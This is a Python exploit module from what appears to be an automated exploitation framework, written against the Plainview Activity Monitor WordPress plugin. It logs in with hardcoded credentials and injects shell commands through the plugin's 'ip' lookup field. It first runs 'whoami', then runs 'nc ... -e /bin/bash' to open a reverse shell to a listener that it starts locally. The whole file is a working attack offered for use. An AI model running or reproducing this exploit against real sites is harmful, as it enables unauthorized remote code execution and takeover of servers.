from .ExpBase import ExpBase
from ..auxiliary_module.auxiliary_func import ListenonPort, AuxiliaryFunc
import threading
import requests
from bs4 import BeautifulSoup
from ..ExploitFactory import ExploitFactory, exp_register


class EXP50110(threading.Thread):
    def __init__(self, lhost, lport, rhost, rport):
        threading.Thread.__init__(self)
        self.lhost = lhost
        self.lport = lport
        self.rhost = rhost
        self.rport = rport
    
    def __get_usr_info(self):
        #self.username = input("username:")
        #self.passwd = input("passwd:")
        self.username = "mark"
        self.passwd = "helpdesk01"
        
    def __get_cookie(self):
        admin_url = "http://" + self.rhost + "/wp-login.php"
        self.__get_usr_info()
        data = {
            'log': self.username,
            'pwd': self.passwd,
            #wp-submit=Log+In&redirect_to=http%3A%2F%2Fwordy%2Fwp-admin%2F&testcookie=1
            'wp-submit': 'Log In',
            'testcookie': 1
        }
        
        x = requests.post(admin_url, data = data)
        self.cookies = {}
        cookie = str(x.headers['Set-Cookie'])
        
        for i in cookie.split():
            if "wordpress" in i and "=" in i:
                self.cookies[i.split('=')[0]] = i.split('=')[1][:len(i.split('=')[1])-1]
        print(self.cookies)
        
            
    def __poc(self):
        self.url = "http://" + self.rhost + "/wp-admin/admin.php?page=plainview_activity_monitor&tab=activity_tools"
        self.__get_cookie()
        data = {
            'ip': 'google.fr | whoami',
            'lookup': 'Lookup'
        }
        x = requests.post(self.url, data=data, cookies=self.cookies)
        #解析出whoami的执行结果
        html_doc = x.text.split("<p>Output from dig: </p>")[1]
        soup = BeautifulSoup(html_doc, "html.parser")
        whoami = soup.find('p').text
        print("[*]Exploit Succeed! ")
        self.__exploit(whoami)

    def __exploit(self, whoami):
        
        #发送exp
        data = {
            'ip': 'google.fr | nc {} {} -e /bin/bash'.format(self.lhost, self.lport),
            'lookup': 'Lookup'
        }
        
        requests.post(self.url, data=data, cookies=self.cookies)
        
    def run(self):
        self.__poc()
        
        print("exploit 结束")
        
@exp_register('50110')
class Exploit_50110(ExpBase):
    def __init__(self, target_ip, target_port):
        super().__init__(target_ip, target_port)
        
        #本exp需要反弹shell
        aux = AuxiliaryFunc()
        self.local_ip, self.local_port = aux.local_ip_port()

    def exploit(self):
        thread1 = EXP50110(self.local_ip, self.local_port, self.target_ip, self.target_port)
        thread2 = ListenonPort(self.local_port)

        thread1.start()
        thread2.start()

        thread1.join()
        thread2.join()

        print("退出主线程")